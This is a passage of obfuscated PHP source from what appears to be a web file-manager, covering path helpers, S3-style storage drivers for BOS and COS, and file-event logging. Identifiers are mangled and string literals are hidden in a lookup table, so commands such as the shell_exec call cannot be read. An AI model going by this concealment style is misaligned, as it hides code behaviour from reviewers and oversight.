$ã×æ¡¨‰[1]; $‹°ŸÀ€œ[$¿†ˆ”•[33]] = $ß¸£¸Ö‰; $‹°ŸÀ€œ[$¿†ˆ”•[1348]] = substr($ß¸£¸Ö‰, 1, -1); $‹°ŸÀ€œ[$¿†ˆ”•[475]] = $ã×æ¡¨‰[3]; } $‹°ŸÀ€œ[$¿†ˆ”•[1243]] = $ã×æ¡¨‰[4]; } $øÈÅ¢¢Š = array($¿†ˆ”•[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $‹°ŸÀ€œ[$¿†ˆ”•[1311]] = in_array($‹°ŸÀ€œ[$¿†ˆ”•[33]], $øÈÅ¢¢Š); return $‹°ŸÀ€œ; } public static function isTruePath($™á‡¤Öı) { $ÎÀüÌ÷œ =& $_SERVER[ˆ¡¹µ‹Â]; if (substr($™á‡¤Öı, 0, 1) != $ÎÀüÌ÷œ[1347]) { return !0; } if (strpos($™á‡¤Öı, $ÎÀüÌ÷œ[483]) === 0) { return !0; } if (strpos($™á‡¤Öı, $ÎÀüÌ÷œ[1315]) === 0) { return !0; } if (strpos($™á‡¤Öı, $ÎÀüÌ÷œ[1349]) === 0) { return !0; } if (strpos($™á‡¤Öı, $ÎÀüÌ÷œ[1350]) === 0) { return !0; } if (strpos($™á‡¤Öı, $ÎÀüÌ÷œ[1351]) === 0) { return !0; } return !1; } public static function clear($Æ¢ğ±™) { $á¼‰Ÿ—º =& $_SERVER[ˆ¡¹µ‹Â]; $Æ¢ğ±™ = str_replace(array($á¼‰Ÿ—º[1150], $á¼‰Ÿ—º[262]), $á¼‰Ÿ—º[53], $Æ¢ğ±™); $Æ¢ğ±™ = str_replace($á¼‰Ÿ—º[100], $á¼‰Ÿ—º[8], $Æ¢ğ±™); $¨ğèËˆÊ = $á¼‰Ÿ—º[1352]; if (substr($Æ¢ğ±™, 0, 3) == $á¼‰Ÿ—º[1353]) { $Æ¢ğ±™ = substr($Æ¢ğ±™, 3); } while (strstr($Æ¢ğ±™, $¨ğèËˆÊ)) { $Æ¢ğ±™ = str_replace($¨ğèËˆÊ, $á¼‰Ÿ—º[8], $Æ¢ğ±™); } $Æ¢ğ±™ = preg_replace($á¼‰Ÿ—º[1354], $á¼‰Ÿ—º[8], $Æ¢ğ±™); if ($Æ¢ğ±™ == $á¼‰Ÿ—º[8]) { return $á¼‰Ÿ—º[8]; } $Æ¢ğ±™ = rtrim($Æ¢ğ±™, $á¼‰Ÿ—º[8]); return $Æ¢ğ±™; } public static function pathTrue($åèõœ«Œ) { $¸ë»â‘ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$åèõœ«Œ) { return $¸ë»â‘[12]; } $åèõœ«Œ = str_replace($¸ë»â‘[592], $¸ë»â‘[8], str_replace($¸ë»â‘[1355], $¸ë»â‘[8], $åèõœ«Œ)); $åèõœ«Œ = str_replace($¸ë»â‘[592], $¸ë»â‘[8], str_replace($¸ë»â‘[1355], $¸ë»â‘[8], $åèõœ«Œ)); if (!strstr($åèõœ«Œ, $¸ë»â‘[1353])) { return $åèõœ«Œ; } $‘§æ Ü” = explode($¸ë»â‘[8], $åèõœ«Œ); foreach ($‘§æ Ü” as $îØÜ˜… => $Øê…×îğ) { if ($Øê…×îğ !== $¸ë»â‘[1356]) { continue; } for ($â™®£Ó† = $îØÜ˜…; $â™®£Ó† >= 0; $â™®£Ó†--) { if ($‘§æ Ü”[$â™®£Ó†] === $¸ë»â‘[10] || $‘§æ Ü”[$â™®£Ó†] === $¸ë»â‘[1356] || $‘§æ Ü”[$â™®£Ó†] === -1) { continue; } if ($‘§æ Ü”[$â™®£Ó†] === $¸ë»â‘[12]) { $‘§æ Ü”[$îØÜ˜…] = -1; break; } $‘§æ Ü”[$îØÜ˜…] = -1; $‘§æ Ü”[$â™®£Ó†] = -1; break; } } $ãÔÁÊ­‘ = array(); foreach ($‘§æ Ü” as $Øê…×îğ) { if ($Øê…×îğ !== -1) { $ãÔÁÊ­‘[] = $Øê…×îğ; } } $À¼šæÃ = implode($¸ë»â‘[8], $ãÔÁÊ­‘); if (strpos($À¼šæÃ, $¸ë»â‘[1357]) === 0) { $À¼šæÃ = $¸ë»â‘[1353] . substr($À¼šæÃ, strlen($¸ë»â‘[1357])); } return $À¼šæÃ; } public static function pathUrlClear($ŸÈğ£Åµ) { $¦¶Ò¬š =& $_SERVER[ˆ¡¹µ‹Â]; if (!$ŸÈğ£Åµ) { return $ŸÈğ£Åµ; } $ŸÈğ£Åµ = rawurldecode($ŸÈğ£Åµ); $ŸÈğ£Åµ = str_replace($¦¶Ò¬š[1355], $¦¶Ò¬š[8], $ŸÈğ£Åµ); if (strpos($ŸÈğ£Åµ, $¦¶Ò¬š[76]) > 0) { $ŸÈğ£Åµ = substr($ŸÈğ£Åµ, 0, strpos($ŸÈğ£Åµ, $¦¶Ò¬š[76])); } if (strpos($ŸÈğ£Åµ, $¦¶Ò¬š[1358]) > 0) { $ŸÈğ£Åµ = substr($ŸÈğ£Åµ, 0, strpos($ŸÈğ£Åµ, $¦¶Ò¬š[1358])); } return $ŸÈğ£Åµ; } public static function sourceID($€—¹œƒÃ) { $ã®èñĞÀ =& $_SERVER[ˆ¡¹µ‹Â]; $å‹˜êó‘ = self::parse($€—¹œƒÃ); if ($å‹˜êó‘[$ã®èñĞÀ[33]] !== self::KOD_SOURCE) { show_json(LNG($ã®èñĞÀ[1359]), !1); } return $å‹˜êó‘[$ã®èñĞÀ[475]]; } public static function make($á•çâ’­) { if (!$á•çâ’­) { return !1; } return self::makePath(self::KOD_SOURCE, intval($á•çâ’­)); } public static function makeShare($¯³éÈŠü, $‚¥ºà…) { return self::makePath(self::KOD_SHARE_ITEM, $¯³éÈŠü, $‚¥ºà…); } public static function makeFileTypePath($û‰áÏ¼) { return self::makePath(self::KOD_USER_FILE_TYPE, $û‰áÏ¼); } public static function makeFileTagPath($êŠØòñ…) { return self::makePath(self::KOD_USER_FILE_TAG, $êŠØòñ…); } public static function makePath($ª¡óö½¢, $˜’Â—¥ = '', $åêÊÇÖì = '') { $Ã¥ßí™é =& $_SERVER[ˆ¡¹µ‹Â]; $Úè’ Î² = substr($ª¡óö½¢, 1, -1); $Ë£ºòâ = $Ã¥ßí™é[1360] . $Úè’ Î² . $Ã¥ßí™é[1361] . $˜’Â—¥ . $Ã¥ßí™é[1362]; $Ë£ºòâ = $åêÊÇÖì ? $Ë£ºòâ . $åêÊÇÖì . $Ã¥ßí™é[8] : $Ë£ºòâ; return $Ë£ºòâ; } public static function hashPath($µñ‹Ø», $ˆ»äô„ = true) { $îº’°í’ =& $_SERVER[ˆ¡¹µ‹Â]; $Ş¬ı¼… = is_array($µñ‹Ø») ? $µñ‹Ø» : IO::info($µñ‹Ø»); $üşêè‹ = _get($Ş¬ı¼…, $îº’°í’[1363], $îº’°í’[12]); if (!$üşêè‹ && isset($Ş¬ı¼…[$îº’°í’[235]])) { $üşêè‹ = trim($Ş¬ı¼…[$îº’°í’[235]], $îº’°í’[121]); } if (!$üşêè‹ && isset($Ş¬ı¼…[$îº’°í’[193]]) && $Ş¬ı¼…[$îº’°í’[193]]) { $Ş¬ı¼… = IO::info(KodIO::make($Ş¬ı¼…[$îº’°í’[193]])); $üşêè‹ = _get($Ş¬ı¼…, $îº’°í’[1363], $îº’°í’[12]); } $Ã‘Á² = md5($Ş¬ı¼…[$îº’°í’[87]] . $Ş¬ı¼…[$îº’°í’[79]] . $Ş¬ı¼…[$îº’°í’[88]]); if (!$üşêè‹ && file_exists($Ş¬ı¼…[$îº’°í’[87]])) { $üşêè‹ = Cache::get($Ã‘Á² . $îº’°í’[1364]); $üşêè‹ = !1; if (!$üşêè‹) { $üşêè‹ = IO::hashSimple($Ş¬ı¼…[$îº’°í’[87]]); Cache::set($Ã‘Á² . $îº’°í’[1364], $üşêè‹, 3600 * 24 * 30); } } if ($ˆ»äô„ && !$üşêè‹) { } return $üşêè‹ ? $üşêè‹ : $Ã‘Á²; } public static function hashPathSafe($ãªûš², $º‡Ù„íÓ = true) { $©Ü œôÊ =& $_SERVER[ˆ¡¹µ‹Â]; $à”‹×ı™ = self::hashPath($ãªûš², $º‡Ù„íÓ); return md5($à”‹×ı™ . $©Ü œôÊ[1365] . Model($©Ü œôÊ[837])->get($©Ü œôÊ[838])); } public static function initSystemPath() { $©ÂÂ„û =& $_SERVER[ˆ¡¹µ‹Â]; if (defined($©ÂÂ„û[1366])) { return; } define($©ÂÂ„û[1366], self::systemPath($©ÂÂ„û[191])); define($©ÂÂ„û[1367], self::systemPath($©ÂÂ„û[1368])); define($©ÂÂ„û[1369], self::systemPath($©ÂÂ„û[1370])); define($©ÂÂ„û[1371], self::systemPath($©ÂÂ„û[1372])); IOHistory::bindEvent(); } public static function systemPath($ßÒÚİ¸š) { $îò“Ø¾Ü =& $_SERVER[ˆ¡¹µ‹Â]; $¸º¤µó‡ = $îò“Ø¾Ü[1373] . ucfirst($ßÒÚİ¸š); $«Á‡ü×å = Model($îò“Ø¾Ü[837])->get($¸º¤µó‡); if ($«Á‡ü×å) { return $«Á‡ü×å; } if ($ßÒÚİ¸š == $îò“Ø¾Ü[191]) { $«Á‡ü×å = self::make(Model($îò“Ø¾Ü[899])->systemRootPathAdd($îò“Ø¾Ü[605])); } else { $«Á‡ü×å = self::systemPath($îò“Ø¾Ü[191]); $â¥ÜÉÇ® = self::sourceID($«Á‡ü×å); $«Á‡ü×å = self::make(Model($îò“Ø¾Ü[899])->mkdir($â¥ÜÉÇ®, $ßÒÚİ¸š)); } Model($îò“Ø¾Ü[837])->set($¸º¤µó‡, $«Á‡ü×å); return $«Á‡ü×å; } public static function systemFolder($À”„¢—Å) { $ã¶—ÌÊ¥ = IO_PATH_SYSTEM_SOURCE . $À”„¢—Å; $©Æœ‚ÏÀ = Cache::get($ã¶—ÌÊ¥); if (!$©Æœ‚ÏÀ) { $ÖÅÎí­Â = IO::infoFullSimple($ã¶—ÌÊ¥); if (!$ÖÅÎí­Â) { $©Æœ‚ÏÀ = IO::mkdir($ã¶—ÌÊ¥, REPEAT_SKIP); } else { $©Æœ‚ÏÀ = $ÖÅÎí­Â[$_SERVER[ˆ¡¹µ‹Â][87]]; } Cache::set($ã¶—ÌÊ¥, $©Æœ‚ÏÀ, 3600 * 10); } return $©Æœ‚ÏÀ; } public static function defaultDriver() { return Model($_SERVER[ˆ¡¹µ‹Â][834])->defaultDriver(); } public static function defaultIO() { $ÁÕœ¼¦ =& $_SERVER[ˆ¡¹µ‹Â]; $á·Å’à² = self::defaultDriver(); return $ÁÕœ¼¦[1374] . $á·Å’à²[$ÁÕœ¼¦[475]] . $ÁÕœ¼¦[1362]; } public static function defaultDriverInit() { static $àµñšÆ = false; if ($àµñšÆ) { return $àµñšÆ; } $àµñšÆ = IO::init(self::defaultIO()); return $àµñšÆ; } public static function fileTypeList() { $ìıìñ¬© =& $_SERVER[ˆ¡¹µ‹Â]; $åûÜ®Ë = $GLOBALS[$ìıìñ¬©[6]][$ìıìñ¬©[1375]]; foreach ($åûÜ®Ë as $İıÜÇ¦¿ => $ï¤Ä½Õ) { $›´ó±Û™ = $ìıìñ¬©[1376] . $İıÜÇ¦¿; $‘µôñÚ¤ = LNG($›´ó±Û™); if ($›´ó±Û™ != $‘µôñÚ¤) { $åûÜ®Ë[$İıÜÇ¦¿][$ìıìñ¬©[32]] = $‘µôñÚ¤; } } return $åûÜ®Ë; } public static function diskList($¼¶«®¢¿ = true) { $ÌïÂªŠ× = $_SERVER[ˆ¡¹µ‹Â][1377]; if ($¼¶«®¢¿) { $ÚÇ¦²‘ = Cache::get($ÌïÂªŠ×); if (is_array($ÚÇ¦²‘)) { return $ÚÇ¦²‘; } } $ÚÇ¦²‘ = self::diskListGet(); Cache::set($ÌïÂªŠ×, $ÚÇ¦²‘, 60); return $ÚÇ¦²‘; } public static function diskListGet() { $éÙœ®€¬ =& $_SERVER[ˆ¡¹µ‹Â]; $ÑåúÎ·Ç = array(); if ($GLOBALS[$éÙœ®€¬[6]][$éÙœ®€¬[1378]] == $éÙœ®€¬[1379]) { $°Ö‘ü‰ = $éÙœ®€¬[1380]; for ($Š˜‹­¦° = 0; $Š˜‹­¦° < strlen($°Ö‘ü‰); $Š˜‹­¦°++) { $ç‰ƒ¾©é = $°Ö‘ü‰[$Š˜‹­¦°] . $éÙœ®€¬[1381]; if (file_exists($ç‰ƒ¾©é)) { $ÑåúÎ·Ç[] = $ç‰ƒ¾©é; } } return $ÑåúÎ·Ç; } if (!function_exists($éÙœ®€¬[101])) { $ÑåúÎ·Ç[] = $éÙœ®€¬[910]; return $ÑåúÎ·Ç; } $ˆ¥ßøÇ¾ = explode($éÙœ®€¬[262], shell_exec($éÙœ®€¬[1382])); array_shift($ˆ¥ßøÇ¾); array_pop($ˆ¥ßøÇ¾); $ê„±Î = array($éÙœ®€¬[1383], $éÙœ®€¬[1384], $éÙœ®€¬[1385], $éÙœ®€¬[1386], $éÙœ®€¬[1387], $éÙœ®€¬[1388], $éÙœ®€¬[1389], $éÙœ®€¬[1390]); foreach ($ˆ¥ßøÇ¾ as $ÂªİäÄĞ) { $¸¨­øïÏ = preg_split($éÙœ®€¬[1391], $ÂªİäÄĞ); $ç‰ƒ¾©é = $¸¨­øïÏ[count($¸¨­øïÏ) - 1]; if (!strstr($¸¨­øïÏ[0], $éÙœ®€¬[1392]) || !$ç‰ƒ¾©é) { continue; } $ÔúùŒï” = rtrim($ç‰ƒ¾©é, $éÙœ®€¬[8]) . $éÙœ®€¬[8]; if (in_array($ÔúùŒï”, $ê„±Î)) { continue; } $ÑåúÎ·Ç[] = $ÔúùŒï”; } return $ÑåúÎ·Ç; } public static function isSameDisk($‡€òÇı, $òğö‹æ¦) { $®Šà¼Õ =& $_SERVER[ˆ¡¹µ‹Â]; if ($GLOBALS[$®Šà¼Õ[6]][$®Šà¼Õ[1378]] == $®Šà¼Õ[1379]) { return strtolower(substr($‡€òÇı, 0, 1)) == strtolower(substr($òğö‹æ¦, 0, 1)); } $Í˜ğŞì = self::diskList(); $¿˜À–º = !1; $§œÌçéë = !1; sort($Í˜ğŞì); $Í˜ğŞì = array_reverse($Í˜ğŞì); $‡€òÇı = rtrim($‡€òÇı, $®Šà¼Õ[8]) . $®Šà¼Õ[8]; $òğö‹æ¦ = rtrim($òğö‹æ¦, $®Šà¼Õ[8]) . $®Šà¼Õ[8]; foreach ($Í˜ğŞì as $ëáâ˜Ô­) { $ÂöÇ„ÂÏ = strlen($ëáâ˜Ô­); if (!$¿˜À–º && substr($‡€òÇı, 0, $ÂöÇ„ÂÏ) == $ëáâ˜Ô­) { $¿˜À–º = $ëáâ˜Ô­; } if (!$§œÌçéë && substr($òğö‹æ¦, 0, $ÂöÇ„ÂÏ) == $ëáâ˜Ô­) { $§œÌçéë = $ëáâ˜Ô­; } if ($¿˜À–º && $§œÌçéë) { break; } } return $¿˜À–º === $§œÌçéë; } public static function transferType($Ÿº÷ªë, $ó‹³±±¼) { $ñîÆß”± =& $_SERVER[ˆ¡¹µ‹Â]; $£¾„ò¥Ë = self::driverType($Ÿº÷ªë); $ˆªå…×Ï = self::driverType($ó‹³±±¼); if ($£¾„ò¥Ë[$ñîÆß”±[33]] == $ˆªå…×Ï[$ñîÆß”±[33]] && $£¾„ò¥Ë[$ñîÆß”±[1393]] == $ˆªå…×Ï[$ñîÆß”±[1393]]) { return $ñîÆß”±[1394]; } if ($£¾„ò¥Ë[$ñîÆß”±[33]] == $ñîÆß”±[943] && $ˆªå…×Ï[$ñîÆß”±[33]] == $ñîÆß”±[109]) { return $ñîÆß”±[1272]; } if ($£¾„ò¥Ë[$ñîÆß”±[33]] == $ñîÆß”±[109] && $ˆªå…×Ï[$ñîÆß”±[33]] == $ñîÆß”±[943]) { return $ñîÆß”±[110]; } return $ñîÆß”±[1395]; } public static function driverType($ûŞÏÍßœ) { $Èıßâû¼ =& $_SERVER[ˆ¡¹µ‹Â]; $º—åúîÉ = str_replace($Èıßâû¼[1396], $Èıßâû¼[12], strtolower($ûŞÏÍßœ->getType())); if ($º—åúîÉ == $Èıßâû¼[824] || $º—åúîÉ == $Èıßâû¼[1397] || $º—åúîÉ == $Èıßâû¼[1398]) { $ûŞÏÍßœ = self::defaultDriverInit(); } else { if ($º—åúîÉ == $Èıßâû¼[1282] || $º—åúîÉ == $Èıßâû¼[1399]) { $ûŞÏÍßœ = IO::init($ûŞÏÍßœ->pathParse[$Èıßâû¼[1225]]); } } $¥Ë‹ğ®Ì = $ûŞÏÍßœ->path; $º—åúîÉ = str_replace($Èıßâû¼[1396], $Èıßâû¼[12], strtolower($ûŞÏÍßœ->getType())); if ($º—åúîÉ == $Èıßâû¼[109]) { return array($Èıßâû¼[33] => $Èıßâû¼[109], $Èıßâû¼[1393] => $Èıßâû¼[12], $Èıßâû¼[87] => $¥Ë‹ğ®Ì, $Èıßâû¼[98] => $ûŞÏÍßœ); } return array($Èıßâû¼[33] => $Èıßâû¼[943], $Èıßâû¼[1393] => $ûŞÏÍßœ->pathDriver, $Èıßâû¼[87] => $¥Ë‹ğ®Ì, $Èıßâû¼[98] => $ûŞÏÍßœ); } public static function pathDriverType($è»€Äïî) { return $è»€Äïî ? self::driverType(IO::init($è»€Äïî)) : !1; } public static function pathDriverLocal($Ğ¯…Áµ½) { $ÍšÄÈÕ¤ =& $_SERVER[ˆ¡¹µ‹Â]; $Èğ„Şè„ = $Ğ¯…Áµ½ ? self::driverType(IO::init($Ğ¯…Áµ½)) : !1; return strtolower($Èğ„Şè„[$ÍšÄÈÕ¤[33]]) == $ÍšÄÈÕ¤[109] ? !0 : !1; } public static function allowCover($™áÅÖ­, $˜Å’Ùù = true) { $òš³ğ«· =& $_SERVER[ˆ¡¹µ‹Â]; if (is_string($™áÅÖ­)) { $™áÅÖ­ = IO::info($™áÅÖ­); } if (!$™áÅÖ­ || $™áÅÖ­[$òš³ğ«·[33]] == $òš³ğ«·[78] || $™áÅÖ­[$òš³ğ«·[79]] <= 100) { return !1; } if (isset($™áÅÖ­[$òš³ğ«·[1400]]) || !$™áÅÖ­[$òš³ğ«·[87]]) { return !1; } if (isset($™áÅÖ­[$òš³ğ«·[232]]) && !$™áÅÖ­[$òš³ğ«·[232]]) { return !1; } static $´˜ü¦ñª = false; if (!$´˜ü¦ñª || !$˜Å’Ùù) { $Ó¸å°å = self::driverType(IO::init($™áÅÖ­[$òš³ğ«·[87]])); $À‰‘îû® = $Ó¸å°å[$òš³ğ«·[98]]; $´˜ü¦ñª = $òš³ğ«·[196]; if ($Ó¸å°å[$òš³ğ«·[33]] == $òš³ğ«·[109]) { $´˜ü¦ñª = $òš³ğ«·[1401]; } if ($Ó¸å°å[$òš³ğ«·[98]] && is_array($Ó¸å°å[$òš³ğ«·[98]]->config)) { $­ƒˆñ¶Ã = $Ó¸å°å[$òš³ğ«·[98]]->config; if (isset($­ƒˆñ¶Ã[$òš³ğ«·[1402]]) && $­ƒˆñ¶Ã[$òš³ğ«·[1402]]) { $´˜ü¦ñª = $òš³ğ«·[1401]; } } $Ë»ßğ¾” = KodIO::defaultDriver(); if (strtolower($Ë»ßğ¾”[$òš³ğ«·[98]]) == $òš³ğ«·[109] && is_array($Ë»ßğ¾”[$òš³ğ«·[6]])) { $ÀÒëÉŒ = $Ë»ßğ¾”[$òš³ğ«·[6]][$òš³ğ«·[1255]]; if (substr($ÀÒëÉŒ, 0, 2) == $òš³ğ«·[1403]) { $ÀÒëÉŒ = str_replace($òš³ğ«·[1403], BASIC_PATH, $ÀÒëÉŒ); } $ÀÒëÉŒ = str_replace($òš³ğ«·[592], $òš³ğ«·[8], $ÀÒëÉŒ); if (substr($™áÅÖ­[$òš³ğ«·[87]], 0, strlen($ÀÒëÉŒ)) == $ÀÒëÉŒ) { $´˜ü¦ñª = $òš³ğ«·[196]; } } } return $´˜ü¦ñª == $òš³ğ«·[1401] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ı©ÃŠœí) { parent::__construct($ı©ÃŠœí); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($‚îö™ĞØ) { $—¢ÓÉ¡® =& $_SERVER[ˆ¡¹µ‹Â]; if (substr($‚îö™ĞØ, 0, 7) == $—¢ÓÉ¡®[313]) { $‚îö™ĞØ = $—¢ÓÉ¡®[314] . substr($‚îö™ĞØ, 7); } header($—¢ÓÉ¡®[175] . $‚îö™ĞØ); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ÕĞ¤ÏŠ) { parent::__construct($ÕĞ¤ÏŠ); $this->setSignVersion($_SERVER[ˆ¡¹µ‹Â][247]); } public function uploadFormData($£¨´óƒğ, $‰¼„¸¸î = 3600) { $ñÓÈ•Ïµ =& $_SERVER[ˆ¡¹µ‹Â]; $¹üíÜ Î = $ñÓÈ•Ïµ[229]; $ˆ²—Íªš = $ñÓÈ•Ïµ[263]; $äâ¡¡…ü = $ñÓÈ•Ïµ[274]; $òÒÆ‹ÈÅ = gmdate($ñÓÈ•Ïµ[299], time() + $‰¼„¸¸î); $ÂµİÇ¥Ÿ = (string) time() . $ñÓÈ•Ïµ[74] . (string) (time() + $‰¼„¸¸î); $‚‰óÚ½– = array($ñÓÈ•Ïµ[275] => $òÒÆ‹ÈÅ, $ñÓÈ•Ïµ[278] => array(array($ñÓÈ•Ïµ[280] => $¹üíÜ Î), array($ñÓÈ•Ïµ[279] => $this->bucket), array($ñÓÈ•Ïµ[281], $ñÓÈ•Ïµ[282], $ñÓÈ•Ïµ[12]), array($ñÓÈ•Ïµ[285] => $äâ¡¡…ü), array($ñÓÈ•Ïµ[1404] => $ˆ²—Íªš), array($ñÓÈ•Ïµ[1405] => $this->accessKey), array($ñÓÈ•Ïµ[1406] => $ÂµİÇ¥Ÿ))); $‚‰óÚ½– = json_encode($‚‰óÚ½–); $ †³¡Óƒ = hash_hmac($ñÓÈ•Ïµ[263], $ÂµİÇ¥Ÿ, $this->secret); $ÑÒªÏ = sha1($‚‰óÚ½–); $Ë¬àÂ = hash_hmac($ñÓÈ•Ïµ[263], $ÑÒªÏ, $ †³¡Óƒ); $Ä€Ş­—Š = array($ñÓÈ•Ïµ[280] => $¹üíÜ Î, $ñÓÈ•Ïµ[285] => $äâ¡¡…ü, $ñÓÈ•Ïµ[293] => base64_encode($‚‰óÚ½–), $ñÓÈ•Ïµ[1404] => $ˆ²—Íªš, $ñÓÈ•Ïµ[1405] => $this->accessKey, $ñÓÈ•Ïµ[1407] => $ÂµİÇ¥Ÿ, $ñÓÈ•Ïµ[1408] => $Ë¬àÂ, $ñÓÈ•Ïµ[208] => $this->getHost()); return $Ä€Ş­—Š; } public function fileOutImage($Œ•ãÀÖê, $èéñÜ‚Ò = 250) { $ïõ§Å™Å =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->size($Œ•ãÀÖê) > 1024 * 1024 * 32) { return $this->fileOutImageServer($Œ•ãÀÖê, $èéñÜ‚Ò); } $Ä³Êí¿Ø = $this->link($Œ•ãÀÖê); $Ä³Êí¿Ø .= $ïõ§Å™Å[1409] . $èéñÜ‚Ò . $ïõ§Å™Å[1410]; $this->fileOutLink($Ä³Êí¿Ø); } public function fileOutLink($«ªğÖ©¢) { $èå°Á¨˜ =& $_SERVER[ˆ¡¹µ‹Â]; if (substr($«ªğÖ©¢, 0, 7) == $èå°Á¨˜[313]) { $«ªğÖ©¢ = $èå°Á¨˜[314] . substr($«ªğÖ©¢, 7); } header($èå°Á¨˜[175] . $«ªğÖ©¢); die; } } goto d‹£‘Í˜ˆÜ; cßòìÀù…: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\x72\143\x65\137\x65\166\x65\156\164"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\124\x69\x6d\145", "\164\151\155\145", "\151\x6e\x73\145\162\164", "\x66\165\x6e\x63\164\151\157\156"), array("\x64\x65\163\x63", '', "\151\156\163\x65\x72\164\x2c\x75\160\x64\x61\164\145\54\x73\145\x6c\145\143\x74", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¡ÃŞ¦Æò, $ù³­ç­í, $×±½Ã€ = '') { $öéùùÒ´ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->eventSave) { return; } $¹â¥¤£ = Model($öéùùÒ´[1411])->sourceInfo($¡ÃŞ¦Æò); if (!$¹â¥¤£) { return !1; } if ($this->isDisableEvent($¹â¥¤£, $ù³­ç­í)) { return; } if ($×±½Ã€ && is_string($×±½Ã€)) { $×±½Ã€ = array($öéùùÒ´[2001] => $×±½Ã€); } $ë¶•Êü = defined($öéùùÒ´[2189]) ? USER_ID : 0; $ŒÔ¡ˆ = array($öéùùÒ´[491] => $¡ÃŞ¦Æò, $öéùùÒ´[2190] => $¹â¥¤£[$öéùùÒ´[192]], $öéùùÒ´[2191] => $¹â¥¤£[$öéùùÒ´[32]], $öéùùÒ´[582] => !empty($¹â¥¤£[$öéùùÒ´[582]]) ? $¹â¥¤£[$öéùùÒ´[582]] : $öéùùÒ´[12], $öéùùÒ´[1754] => $ë¶•Êü, $öéùùÒ´[496] => $ù³­ç­í, $öéùùÒ´[1756] => $×±½Ã€); $this->addSystemLog($ù³­ç­í, $ŒÔ¡ˆ); unset($ŒÔ¡ˆ[$öéùùÒ´[2191]], $ŒÔ¡ˆ[$öéùùÒ´[582]]); return $this->add($ŒÔ¡ˆ); } private function addSystemLog($¿µì®Ş¡, $¤õ¤ñåÍ) { $¥Ï ìŒ® =& $_SERVER[ˆ¡¹µ‹Â]; if ($¿µì®Ş¡ == $¥Ï ìŒ®[2192]) { $¿µì®Ş¡ = $¤õ¤ñåÍ[$¥Ï ìŒ®[526]][$¥Ï ìŒ®[2193]]; } else { if (in_array($¿µì®Ş¡, array($¥Ï ìŒ®[1941], $¥Ï ìŒ®[2194]))) { $¿µì®Ş¡ = $¤õ¤ñåÍ[$¥Ï ìŒ®[526]][$¥Ï ìŒ®[171]]; } } $ÏÊ—×ãº = array_merge($¤õ¤ñåÍ, array($¥Ï ìŒ®[2195] => $¤õ¤ñåÍ[$¥Ï ìŒ®[193]], $¥Ï ìŒ®[2196] => $¤õ¤ñåÍ[$¥Ï ìŒ®[2196]])); Hook::trigger($¥Ï ìŒ®[2197], $¥Ï ìŒ®[2198] . $¿µì®Ş¡, $¤õ¤ñåÍ); Model($¥Ï ìŒ®[1905])->addLog($¥Ï ìŒ®[2198] . $¿µì®Ş¡, $ÏÊ—×ãº); } private function isDisableEvent($¯†şşÇ, $›òüø­¶) { $·ßäÇ¡  =& $_SERVER[ˆ¡¹µ‹Â]; if ($¯†şşÇ[$·ßäÇ¡ [190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($›òüø­¶ == $·ßäÇ¡ [1930]) { return !1; } return !0; } public function eventCreate($€Ş ¾êÆ, $óÒ×ÅŒª) { $ê”»ˆ² =& $_SERVER[ˆ¡¹µ‹Â]; $…·¢ì = Model($ê”»ˆ²[1411])->sourceInfo($€Ş ¾êÆ); $û’ú¤Ï£ = array($ê”»ˆ²[2193] => $óÒ×ÅŒª, $ê”»ˆ²[32] => $…·¢ì[$ê”»ˆ²[32]]); return $this->addEvent($€Ş ¾êÆ, $ê”»ˆ²[2192], $û’ú¤Ï£); } public function eventFileEdit($Ø¸¢«Ö) { $Âš‚ã­ =& $_SERVER[ˆ¡¹µ‹Â]; $Ú‚Í²•š = array($Âš‚ã­[2199] => $_SERVER[$Âš‚ã­[2200]], $Âš‚ã­[2201] => strtolower(ACTION)); if (isset($GLOBALS[$Âš‚ã­[7]][$Âš‚ã­[2202]])) { $Ú‚Í²•š[$Âš‚ã­[2202]] = $Âš‚ã­[91]; } return $this->addEvent($Ø¸¢«Ö, $Âš‚ã­[1931], $Ú‚Í²•š); } public function eventRecycle($ú”ççó, $¿•®ŠòÚ) { return $this->addEvent($ú”ççó, $_SERVER[ˆ¡¹µ‹Â][2194], $¿•®ŠòÚ); } private static $_removeLast = ''; public function eventRemove($¯öçŒÍó) { $‚Âòµ¾Ê =& $_SERVER[ˆ¡¹µ‹Â]; self::$_removeLast = $¯öçŒÍó; $õŸ¿îéœ = Model($‚Âòµ¾Ê[1411])->sourceInfo($¯öçŒÍó); $ŠÈšÀš… = array_field_key($õŸ¿îéœ, array($‚Âòµ¾Ê[193], $‚Âòµ¾Ê[541], $‚Âòµ¾Ê[505], $‚Âòµ¾Ê[584])); $î„ÔŠœ = array($‚Âòµ¾Ê[171] => $õŸ¿îéœ[$‚Âòµ¾Ê[32]], $‚Âòµ¾Ê[2201] => ACTION, $‚Âòµ¾Ê[2203] => $ŠÈšÀš…); return $this->addEvent($õŸ¿îéœ[$‚Âòµ¾Ê[192]], $‚Âòµ¾Ê[1930], $î„ÔŠœ); } public function eventShare($€Ö¢²”Ì, $ÓêÈ‘) { return $this->addEvent($€Ö¢²”Ì, $_SERVER[ˆ¡¹µ‹Â][1941], $ÓêÈ‘); } public function eventMove($Ú¤ÙÎ•¬, $Ú–ÓÕö’, $ÒÛğ¨—è) { $ùÖ™µ´¿ =& $_SERVER[ˆ¡¹µ‹Â]; if (self::$_removeLast == $Ú¤ÙÎ•¬) { return; } $µ¨‹«Ïš = Model($ùÖ™µ´¿[1411]); $³ƒâş˜ = $µ¨‹«Ïš->sourceInfo($Ú¤ÙÎ•¬); $¿çÎ¦üÏ = $µ¨‹«Ïš->sourceInfo($Ú–ÓÕö’); $Á¿¸ğú± = $µ¨‹«Ïš->sourceInfo($ÒÛğ¨—è); $æÚ®ğ€© = array($ùÖ™µ´¿[1234] => 